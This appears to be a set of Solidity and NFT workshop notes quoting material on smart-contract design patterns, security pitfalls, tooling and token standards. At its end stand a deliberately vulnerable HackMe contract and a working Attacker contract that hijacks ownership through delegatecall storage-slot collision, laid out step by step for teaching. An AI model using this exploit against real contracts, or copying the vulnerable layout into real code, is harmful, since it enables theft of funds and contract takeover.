# solidity-nft-workshops


# design patterns
  * Security design patterns
    * “The withdrawal pattern is also known as a pull-over-push pattern.”
      * “for(uint i = 0; i < investors.length; i++) {” “investors[i].transfer(amount); //Push ether to user”
      * “It is possible that the address of an investor is a contract address, which has a continually failing fallback function. This leads to whole transaction failure for the distributeDividend() function call each time.”
      * “To avoid the issues described in the preceding text, the contract should be designed in a way that a user should be able to claim their dividend from the contract.”
        * “As you can see in the following code, we have the claimDividend() function, that can be called by anyone.”
      * “We should use the withdrawal pattern or pull-over-push pattern in the following cases, when:
        * You want to send ether/token to multiple addresses from the contract.
        * You want to avoid the risk associated with transferring ether/token from the contract to the users.
        * You want to avoid paying transaction fees as we know, the transaction initiator has to pay the transaction fee to get their transaction included in the blockchain. Hence, you may want to avoid paying transaction fees for transferring ether or token (push transaction) from the contract to your users. Instead, you want your users to pay transaction fees (pull transaction) and get their share of ether/token withdrawn from the contract.”
    * “As the name suggests, the access restriction design pattern restricts access to the functions of the contract based on roles.”
      * “when you need restricted access to a function, you should use modifiers to check for the access rights”
      * “The access restriction pattern should be used in the following cases, when:
        * Some functions should only be allowed to be executed from certain roles
        * Similar kinds of roles and access are needed for one or more functions or actions
        * You want to improve the security of the contracts from unauthorized function calls”
    * “The emergency stop design pattern allows the contract to pause and stop the function calls that could harm the contract state or funds present in the contract.”
      * “The emergency stop design pattern should be used in the following cases, when:
        * You want your contract to be handled differently in case of any emergency situations
        * You want the ability to pause the contract functions in unwanted situations
        * In case of any failure, you want to stop contract failure or state corruption”
  * Creational patterns
    * “The factory contract pattern is used when you want to create a new child contract from a parent contract.”
    * “The factory contract pattern should be used in the following cases, when:
      * A new contract is required for each request to be processed. For example, in the case of creating a new loan term between two parties, a master contract can create a new child contract called Loan. This new Loan contract has logic to handle contract terms and conditions along with the funds as well.
      * You would need to keep the funds separate in a different contract.
      * A separate contract logic should be deployed per request and one or more entities are to be tied together using this newly deployed contract.”
  * Behavioral patterns
    * “The state machine pattern allows a contract to transition from different states and enables certain functions to be executed in each state.”
      * “The state machine pattern should be used in the following cases, when:
        * A contract needs to transition from different states
        * A contract needs to allow different functions and to behave differently during each of the intermediate states”
    * “iterable map pattern allows you to iterate over the mapping entries”
      * “Note that the iteration over the mapping entries should not cause an out-of-gas exception”
      * “To avoid these situations, use the iteration only in the view function.”
        * “This way, you would execute a function via message calls only, without generating a transaction.”
      * “The iterable map pattern should be used in the following cases, when:
        * You need iterable behaviors over the Solidity mappings
        * There would be fewer mapping entries that would require iterable behavior
        * You would need to filter some data out of the mapping and get the result via a view function”
    * “indexed map pattern allows you to read an entry from a map using an index”
      * “The pattern also allows you to remove an item from a map and an array.”
      * “The indexed map pattern can be used in the following cases, when:
        * You want indexed access of an element in a single operation (order of 1 O(1) operation), instead of iterating an array of elements. This is only when the iterable map feature is also required.
        * You also want indexed access for elements along with support to remove elements from the list.”
    * “address list pattern is used to maintain a curated list of addresses by the owner”
      * “For example, you would need a list of whitelisted addresses that are allowed to call a certain function of your contract.”
      * “The address list pattern should be used in the following cases, when:
        * You want to maintain a curated list of addresses.
        * You want to maintain the whitelisted address, which is allowed/disallowed to perform a certain task.
        * You want to maintain a list of contract addresses that are allowed. For example, an address list of ERC20 token contract addresses.”
    * “subscription pattern is used when you need to provide a periodic subscription fee for any kind of service”
      * “To enable this, you can charge a subscription fee for a period of time from the subscriber”
      * “The subscription pattern can be used in the following cases, when:
        * You have a periodic paid service-based model
        * A user has an existing request and they want to purchase a premium status for their request for a limited period of time
        * An existing contract can purchase a premium status for a limited duration”
  * Economic patterns
    * “To check for string equality, we can generate the keccak256 hash of both strings and compare the hashes with each other”
      * “The string equality comparison design pattern should be used in the following cases, when:
        * You want to compare two different strings for equality.
        * The string length is larger than the two characters.
        * There could be multiple sizes of strings passed to a function and we want to have the gas-optimized solution.”
    * “Tight variable packing should be utilized when using structs in Solidity.”
      * “When the storage is allotted to a struct type variable in EVM storage, it is allotted in slots.”
      * “Each storage slot is 32 bytes long. ”
      * “Storing and reading data from these storage slots consumes gas based on the number of storage slots written or accessed.”
      * “Hence, when variables are not tightly packed in a struct, it could consume more storage slots, which would result in more gas consumption during each function call.”
      * “A tight variable packing pattern is only applicable to struct types. It is the developer's responsibility to check the structs used in each contract and ensure that they are tightly packed.”
  * Life cycle patterns
    * “Once a contract is destroyed, it cannot be recreated on the same address. ”
    * “The mortal pattern allows a contract to be destroyed from the Ethereum blockchain.”
      * “The mortal pattern should be used in the following cases, when:
        * You do not want a contract to be present on the blockchain once its job is finished
        * You want the ether held on the contract to be sent to the owner and the contract is not required further
        * You do not need the contract state data after the contract reaches a specific state”
    * “The auto deprecate pattern allows time-based access to certain function calls.”
      * “The auto deprecate design pattern should be used in the following cases, when:
        * You want to allow or restrict a function call before or after a specified time
        * You want to allow or restrict a function call for a specified duration of time
        * Auto-expire a contract, which would not allow any function calls after the expiry time”

# best practices
  * Avoiding floating pragma
    * pragma solidity ^0.5.0; // “starting from 0.5.0 to 0.5.x because the version starts with a ^ (caret sign)”
    * “It is always recommended that pragma should be fixed to the version that you are intending to deploy your contracts with. ”
  * “Avoid sharing a secret on-chain
    * “As the Ethereum blockchain processes transactions slowly, you can see the transaction data and can initiate another transaction.”
    * “For example, in the game Rock-Paper-Scissors, two players each select one of three options at random, and one wins the game.”
      * “But if player 2 knows the option chosen by player 1, then player 2 can select the right option so that he/she wins the game all the time:”
  * “The commit-and-reveal scheme”
    * “In the commit-and-reveal scheme, first, a hash of the original secret is submitted to the blockchain.”
    * “This secret hash is recorded and stored on-chain in the contract”
    * “Once all the players or parties have submitted their secret hash, they all have to reveal their choice by submitting salt, using which they have generated the secret hash”
    * “There are some guidelines you must follow for salt usage:
      * The salt that you have revealed on-chain must not be used again in future transactions. It must be different each time.
      * The salt must be strong enough in terms of number of characters used, so that it becomes difficult to brute-force.
      * If you have used salt while testing on the testnet chain, you should not use the same salt again on the mainnet chain.
      * You must keep you salt stored at secret location until it's revealed.”
  * “Be careful while using loops”
    * “if the loop is updating some state variables of a contract, it should be bounded; otherwise, your contract could get stuck if the loop iteration is hitting the block's gas limit”
    * “You can have unbounded loops for view and pure functions, as these functions are not added into the block; they just read the state from the blockchain when message calls are made to these functions.”
    * “if these view or pure functions (containing loops) you are using in other public/external functions, it could block your contract operation because the view or pure functions would consume gas when they are being called from non-pure / non-view functions”
    * “function calculateDividend(uint from, uint to) public onlyOwner {”
  * “Avoid using tx.origin for authorization”
    * “The msg.sender global variable gives the address of the caller of the function.”
    * “The tx.origin is also a globally available variable that returns the address of the transaction initiator.”
    * “For example, using an EOA account; Alice initiates a transaction to Contract-A which further makes a function call to a Contract-B.”
      * “Then the function present in Contract-B would give the address of the Contract-A when msg.sender is evaluated; however, when tx.origin is evaluated in the same function, it would return the address of Alice's EOA, because Alice is the original transaction initiator.”
    * “The following actions take place in this scenario:
      * An attacker will create an AttackerContract contract and deploy it. Somehow, an attacker would ask the original owner of the Vault contract to send some ether to the AttackerContract contract.
      * Once the original owner sends the ether to AttackerContract, transaction calls the Vault.withdraw() function. Then, it would check that tx.origin is the authorized person of this contract, execute the withdraw() in the Vault contract, and send all the ether present in the Vault contract to the attacker's wallet.”
  * Preventing an attack
    * “You should not use tx.origin in your contract to check for the authorization. Always use msg.sender to check the authorization of the function calls:”
    * require(authorized == msg.sender);
  * “The timestamp can be manipulated by miners”
    * “In the Solidity language, there are two globally available variables: block.timestamp and now”
    * “Both are aliases and are used to get the timestamp when the block is added to the blockchain”
    * “The timestamp of the new block must be greater than the timestamp of the previous block. However, the miner can manipulate the timestamp. ”
    * “As you can see, the random number generation is using blockhash and block.timestamp. As block.timestamp can be manipulated by miners, they can set it in a certain way so that they can benefit from it”
  * “The 15-second blocktime rule”
    * “According to the yellow paper of Ethereum, the timestamp for the new block must be greater than the previous block; otherwise, the block will be rejected.”
  * “Carefully making external function calls”
    * “A contract that consumes less than 8 million gas at the time of deployment can be deployed on the Ethereum blockchain at the moment.”
    * “For example, the Oraclize service is a third-party service that provides APIs to fetch data from the internet and lets you use it in the blockchain. ”
  * “Avoid dependency on untrusted external calls”
  * “Avoid using delegatecall to untrusted contract code”
    * “Library functions are delegate-called to the current contract execution.”
    * “_target.delegatecall(bytes4(keccak256("externalCall()")));”
      * “If the target contract is killed via selfdestruct, the external call to the function will always fail, and if there is any dependency of your contract on that target contract, your contract would stuck forever.”
  * “Rounding errors with division
    * “In the Solidity language, there is no official support for floating-point numbers.”
  * “Using assert(), require(), and revert() properly”
    * “assert(): The assert() function should be used when you want to check for invariants in the code. When any invariant is incorrect, the code execution stops, transaction fails, and contract state changes are reverted. This function should only be used for invariant checking. It should not be used for input validation or pre-condition checking.
    * require(): The require() function should be used when you want to validate the arguments provided to the function. It is also used to check for the valid conditions and variable values to be in an expected state. If the validation fails, the transaction also fails, and the contract state changes are reverted.
    * revert(): The revert() function should be used to simply fail the transaction. Ensure that the revert() function is called under some certain conditions. Once this function is called, the transaction fails, and the contract state changes are reverted. This should be used when you cannot use the require() function.”
  * Front-running attacks
    * “The Ethereum blockchain is slow, and it is a public blockchain.”
    * “Because it is a public blockchain, all the transaction data is open and can be seen by others.”
    * Even when a transaction is in the pending state, its data can be seen by others.”
    * “We only discussed the approve() function-specific front-running attack.”
    * “For example, when a user is registering a unique value, once this is registered, no one is allowed to register it again on the same contract. Like the domain name registration, once it is registered with a user, another person cannot register it again, as the first person has became the owner of that.”
      * “An attacker can watch for the transactions on that contract and can send the high gas-price transaction to front run the user's transaction.
    * “To prevent this type of front-running attack, you should use the commit-and-reveal scheme.”
  * Reentrancy attacks
    * “In this attack technique, an attacker deploys a new contract and calls a specific function on the target contract.”
    * “The call sends ether to the attacker's contract, and their contract makes a function call to the target contract again.”
    * “As we learned previously, in Solidity, you can write a fallback function that can receive ether and execute some code.”
    * “To prevent a reentrancy attack, the state of the variables should be updated first, and then ether should be sent to a user's account”
  * Replay attack
    * “This is a type of attack in which an attacker is allowed to recall the function of the contract, allowing them to update the state variables.”
    * Signature replay attacks
      * “To prevent a replay attack, you should use the nonce in the signed data. ”
      * “The user should sign the data along with a unique nonce value each time.”
  * “Integer overflow and underflow attacks”
    * “One way to avoid integer overflow or underflow attacks in Solidity code is to check for the boundaries of the data type before assigning new values; however, this can be dangerous if any condition is missed.”
    * “Instead, you can use the SafeMath library provided by the OpenZeppelin libraries.”
  * “Ether can be sent forcibly to a contract”
    * “If this fallback function is not present in a contract and it does not have the payable modifier for any function, then your contract is not meant to receive ether.”
    * “However, there is still a possible way to send ether to a contract that does not accept ether.”
      * “This is possible via a selfdestruct function call:”
        * “Let's assume there is a contract x that has some ether present in it.
        * Also, there is a contract y.
        * Contract x calls the selfdestruct(address_Of_ContractY) function.
        * This process sends all ether present in contract x to contract y, even if contract y neither has a fallback function nor a payable function.”
        * “if your contracts are only accepting ether from authorized sources and via either fallback or payable functions, and if your contract code contains some decision logic using address(this).balance (this gives the current ether balance of the contract). Then, an attacker can influence the decision logic, as he would be able to manipulate the contract's ether balance using an unauthorized method. ”
    * “At the moment, there is no possible way to prevent forceful ether sending from happening.”
   
# tools
* “with Infura, you just need to register for free at https://infura.io and it provides you with a link and your unique token to use to connect to the blockchain”
  * “The benefit of using Infura is that you do not need to run your local blockchain for the mainnet and testnets (Ropsten, Kovan, and Rinkeby), as it is maintained by the Infura service”
  * “To give you an example, MetaMask internally uses an Infura link to connect to the Ethereum blockchain.”
* “You can write JavaScript test cases using the Mocha framework and Chai for assertions.”
  * “Before the execution of the contract() function, Truffle will re-deploy all of the contracts again using the migration scripts. This gives each contract() function a clean room for the contract states.”
* “The surya tool is an open source command-line utility tool that is used to generate a number of graphical and other reports.”
  * “The tool works by scanning through the Solidity smart contract files and can generate inheritance and function call graphs”
  * “Using all of these generated graphs and reports, a developer can understand smart contract architecture and dependencies by doing a manual inspection.”
* “Linters are the utility tools that analyze the given source code and report programming errors, bugs, and stylistic errors.”
  * “For the Solidity language, there are two commonly used linter tools available; these are solhint and solium (also known as ethlint)”
  * “solhint provides security and style guideline-specific validations”
  * “ethlint linter is another linter that is similar to solhint”
* “For Solidity, there is an open source tool called solidity-coverage”

# for nft
* “with the ERC20 token standard APIs, it is not possible to get notifications of another action being triggered when an ERC20 standard-specific token is received at the deployed contract”
  * “The token transfers are received at the contract silently.”
  * “The ERC223 standard provides the methods that will be called once the tokens are transferred”
* “In the OpenZeppelin's ERC20 standard implementation, the transfer() and transferFrom() functions also do not have a check for the contract address itself, such as require(to != address(this)). There is a reasoning behind this—to reduce the gas cost of the transaction, as there would be millions of transactions performed using these functions.”
  * “if the tokens are transferred to the contract address itself, those tokens will be locked forever because the contract code does not have a way to take the tokens out of the contract.”
  * “It is not recommended to change the ERC20 implementation and add the contract address check in it.”
  * “However, the functions related to reclaiming tokens can be used in your ERC20 implementation”
  * “This would enable the reclaiming of your contract-specific tokens, as well as other ERC20-specific tokens that were mistakenly sent to the contract”
* “The implementation of the approve() function that we looked at in the previous section is prone to front-running attacks.”
  * “An attacker who initiates a transaction which is to be executed before a specific pending transaction that could benefit an attacker financially is called a front-running attack.”
    * “On the Ethereum blockchain, the transaction gets executed based on the GasPrice someone is offering to process their transaction.”
    * “anyone can read the transactions that are still pending and waiting to be executed in the transaction pool since Ethereum is a public blockchain”
    * “An attacker would observe the transactions that are still pending in the transaction pool and trigger some transaction that could benefit them.”
    * “Originally, Alice wanted Bob to get 1,500 tokens only. However, using the front-running attack, Bob ended up getting, in total, 2,500 tokens.”
      * “For example, after calling the approve() function once, if you want to change it without being attacked using front-running, you can use the increaseApproval() or decreaseApproval() functions.”
    * “To prevent front-running attacks, there are some techniques we can follow.”
      * “You can use the following implementation of the approve() function, which ensures that, before updating the value, it should be set to zero”
        * “require(_value == 0 || allowed[msg.sender][_spender] == 0);”
* “To transfer the tokens using the transferFrom() function, approver must have called the approve() function prior.”
* “if you are calling the transferFrom() function from within a Solidity contract, it is recommended to enclose the call with require() to ensure that the token transfer executed successfully and, in case of any transfer failure, the transaction should revert.”
  * “require(ERC20.transferFrom(from, to, value));”
* “There are some advanced functions that were recently added in the ERC20 token implementations.”
  * “However, these functions are not part of the ERC20 standard APIs”
  * “These functions are just added to improve usage and reduce security issues and attacks”
  * i“n the new OpenZeppelin implementation of ERC20 contracts, there are more functions such as _mint(), _burn(), and _burnFrom() that were also added”
* “ERC721 is a Non-Fungible Token (NFT) standard”
  * “This standard is used in many cases where you want to transfer a whole item that cannot be broken into multiple parts, for example, a house deed or collectible cards”
  * “As you can see in the code, the ERC721 interface also inherits from the ERC165 standard.”
  * “The ERC165 standard is known as the Standard Interface Detection, using which we can publish and detect all interfaces a smart contract implements”
  * In the OpenZeppelin implementation of the ERC721 standard, there are two approval mechanisms: tokenApprovals and operatorApprovals
    * tokenApprovals:
      * mapping(uint256 => address) internal _tokenApprovals;
      * This is a mapping from a token ID to an approved address.
      * It allows a specific address to transfer the ownership of a specific token.
      * It is used for one-time approvals and is cleared after the transfer is completed.
    * operatorApprovals
      * mapping(address => mapping(address => bool)) internal _operatorApprovals;
      * This is a mapping from an owner address to an operator address to a boolean value.
      * It allows an operator to manage (transfer or perform other operations) any tokens owned by the approved owner.
      * This approval is persistent until explicitly revoked.
  * “The transferFrom() function is a public function, used to transfer the given tokenId from the owner's account to the receiver's account. For this function to work, the approval must have been given previously by the owner to the address of the caller of this function.
    * “require(_isApprovedOrOwner(msg.sender, tokenId));”
  * “The safeTransferFrom() function is a public function that is used to safely transfer the NFT from the owner's account to the recipient account.”
    * “safely transfer means that, when a recipient is a contract, you need to ensure that the recipient contract has callbacks registered to let the receiver contract get a notification when ERC721 token transfer is successful”
    * “require(_checkOnERC721Received(from, to, tokenId, _data))”
    * “it makes a call to the _checkOnERC721Received() internal function, which further calls the “callback functions (the onERC721Received() function on the contract receiving the token) in case the recipient of the NFT is a contract (not an Externally Owned Account (EOA)).”
    * “You can pass on the function bytes data into the safeTransferFrom() function in the _data argument”
      * “When this _data parameter is not empty, the further function call will be initiated from the receiver's onERC721Received() function”
  * “contract ABC is ERC721, ERC721Enumerable, ERC721Metadata”
* “ The following is an example of enclosing a token transfer call and an approve call within the require() function:”
  * “require(ERC20(tokenAddress).transferFrom(from, to, value));”
  * “OpenZeppelin provides the SafeERC20.sol contract to ensure the safety of these calls; it is helpful to protect the contract from unintended behavior.”
* “ReentrancyGuard: Using the nonReentrant modifier in the buyTokens() function to prevent reentrancy attacks.
* “By using the WhitelistCrowdsale.sol contract, you can allow ether to be received from known/whitelisted addresses; other addresses cannot send ether to the contract”
* “Let's look at where these contracts can be used:
  * validation/CappedCrowdsale.sol: A crowdsale with an upper limit for the total wei or ether contribution also known as hard-cap
  * validation/IndividuallyCappedCrowdsale.sol: A crowdsale with individually capped upper limit of wei investments
  * validation/PausableCrowdsale.sol: Allows investment only when it isn't paused by PauserRole
  * validation/TimedCrowdsale.sol: A crowdsale that opens and accept ether for a specified duration of time
  * distribution/FinalizableCrowdsale.sol: Allows a special action to be triggered when crowdsale is over
  * distribution/PostDeliveryCrowdsale.sol: A crowdsale that allows its investors to withdraw their tokens only after it finishes
  * emission/AllowanceCrowdsale.sol: A crowdsale in which another wallet contains tokens and allowance is provided to the crowdsale contract so that it can deliver the tokens to the investors
  * emission/MintedCrowdsale.sol: A crowdsale in which new tokens are minted only when investors send ether to the contract
  * price/IncreasingPriceCrowdsale.sol: A crowdsale that increases the rate of the token linearly according to the time”
* “When all of the tokens that have been created on the Ethereum blockchain follow the same standard APIs, it becomes easy for different web and mobile cryptocurrency wallets to support these tokens”
* “The cryptocurrency exchanges support trading of tokens on their exchange”
  * “If all of the tokens support this ERC20 standard, it would be easy for these exchanges to integrate and it would support trading.”
  * “Apart from the cryptocurrency wallets and exchanges, it is also easy for a decentralized exchange to support these standard tokens as they would have to call the ERC20 standard APIs from their smart contracts”
    * “For example, EtherDelta, IDEX, and KyberNetwork are some decentralized exchanges built on top of Ethereum blockchain and they support trading of ERC20 tokens.”
* “The ERC20 standard only defines the interface APIs—the implementation should be written according to your needs”
  * “The most updated and best place to look for the ERC20 implementation is the OpenZeppelin library of Solidity smart contracts”
* “allowed is a nested mapping of two Solidity mapping data types. In the ERC20 standard specification, it is possible for a token holder, X, to assign some allowances to another account, Y, so that Y is allowed to take the approved number of tokens from the token balance of X”
* “The developers must know that there are two types of transfer() functions.”
  * “One is used on the address data types to transfer the ether to that address from the contract”
    * “address(toAddress).transfer(amount);”
  * “The second type is the function defined by the ERC20 standard.”
    * “ERC20(TKNContractAddress).transfer(toAddress, amount);”
* “Coin: A native digital asset or cryptocurrency of a blockchain is called a coin. For example, the bitcoin blockchain has its native cryptocurrency asset, bitcoin (symbol: BTC). The Ethereum blockchain has its native cryptocurrency asset, ether (symbol: ETH), which is required in the blockchain to perform any transaction.”
* “Token: A digital asset or cryptocurrency that is built on top of an existing blockchain is called a token. For example, Maker (symbol: MKR) and Augur (symbol: REP) are ERC20-compliant tokens and are built on the Ethereum blockchain using Solidity smart contracts.”
* “There are two types of exchanges:”
  * “Centralized Exchange: On a centralized exchange, you have to send your cryptocurrency coin or token to the exchange's account. Then, they allow you to trade on their platform.”
    * “As the coins and tokens are held on an exchange's account, there might be a trust issue.”
    * “It is also possible that if the exchange's account is hacked, you will lose your cryptocurrencies”
    * “Binance and Bitfinex are some examples of centralized exchanges”
  * “Decentralized Exchange: On a decentralized exchange, you do not have to send your cryptocurrency coin or token to exchange's account.”
    * y“our coins are kept in your wallet only.”
    * “Instead, you directly trade via exchange platform; coins aren't even kept on the exchange platform”
    * “KyberNetwork, IDEX, and EtherDelta are some of the decentralized exchanges that are available for P2P trading.”
* “Ethereum has its own native currency, ether, which is not ERC20-compliant.”
* https://nfting.medium.com/the-history-of-cryptokitties-ethereums-first-official-gaming-application-499729e50794
* https://betterprogramming.pub/cryptokitties-smart-contract-breakdown-2c3c250d33f6
* https://spectrum.ieee.org/cryptokitties

  # libs
* “ZeppelinOS is a development platform used to develop, deploy, and manage upgradable contracts”
  * “That proxy contract is called a static proxy, as only predefined function calls can be forwarded to the implementation contract.”
  * “However, when creating upgradable contracts using ZeppelinOS, the Proxy contract stores all the state variables and execution is performed at the Proxy contract level.”
    * “this way, the Proxy contract becomes a dynamic proxy and can execute any function call. ”
* Library
    * “The libraries in Solidity are just like contracts, but they are deployed only once and their code is reused in the calling contracts.”
      * “Calls to the library functions use the DELEGATECALL opcode, which means that when a function on a library is called by the contract, only the code of the library function is executed in the context of the calling contract, and the storage of the calling contract is used and modified by the library.”
      * “The library can have pure and view functions, which will be accessible directly from the calling contract because they do not initiate DELEGATECALL.”
      * “You cannot destroy a deployed library.”
      * “When a library is linked to a contract, you can see that library as the implicit base contract of the contract”
      * “For example, with Lib being the name of the library and fname being the function name, you can call Lib.fname() directly from the calling contract.”
      * “All the internal functions of the library are also accessible to the contract, just like how they're available with the inheritance hierarchy.  ”
      * “To attach a library to the contract, we use a special directive called using X for Y;,”
        * “where X is the library and Y is the data type”
        * “For example, the X library has a function called funcName(); in that case, you would be able to call Y.funcName() on the Y datatype”
    * Solidity provides the Library keyword that helps to ensure our library contracts are stateless.
    * Generally, always pay careful attention to which context your code runs in. Also, try to use stateless libraries whenever possible.
    * If you cannot go stateless, ensure that you pay close attention to the layout of all your state variables. As we have seen, neglecting this can be very dangerous.
        ```
        // SPDX-License-Identifier: GPL-3.0
        pragma solidity 0.7.6;

        contract HackMe {
            address lib;
            address public owner;
            uint num;

            constructor(address _lib) {
                owner = msg.sender;
                lib = _lib;
            }

            function doStuff(uint _num) public {
                lib.delegatecall(abi.encodeWithSignature("doStuff(uint256)", _num));
            }
        }

        contract TrustedLib {
            uint num;

            function doStuff(uint _num) public {
                num = _num;
            }
        }
        ```
        * And in Lib, this function changes the first variable of the first slot,
          which is uint someNumber in Lib but address lib in HackMe.
        * attacker
            ```
            contract Attacker {
                address Lib;
                address public owner;
                uint someNumber;

                HackMe hackMe;

                constructor(address _hackMe) {
                    hackMe = HackMe(_hackMe);
                }

                function attack() external {
                    hackMe.doStuff(uint(address(this)));  // -------- (I)
                    hackMe.doStuff(1);  // -------- (II)
                }

                function doStuff(uint _num) public { // HackMe will delegatecall this when (II) gets execute after (I)
                    owner = msg.sender; // updates owner of HackMe
                }
            }
            ```
            * Since delegate call changes state of caller using the delegated contract's function, this will cause change in the address lib in HackMe (because that's the first variable in HackMe).
            * Let's now see how Attacker can take advantage of this:

              Attacker will have same variable order as HackMe contract.
              Attacker will have a doStuff() function with same signature, which will change the owner variable (2md variable).
            * Step - I

              Attacker will call doStuff() function in HackMe passing it's own address in uint form (not possible after 0.8.0) as input.
              This will change address lib value to the address of Attacker contract.
            * Step - II

              Now Attacker will again call doStuff() function in HackMe with some random uint input, this time HackMe delegate calls the Attacker (because Step - I)
              And doStuff() function in Attacker will change the owner variable to msg.sender(attacker address) in the HackMe. Hence high-jacking the HackMe contract.
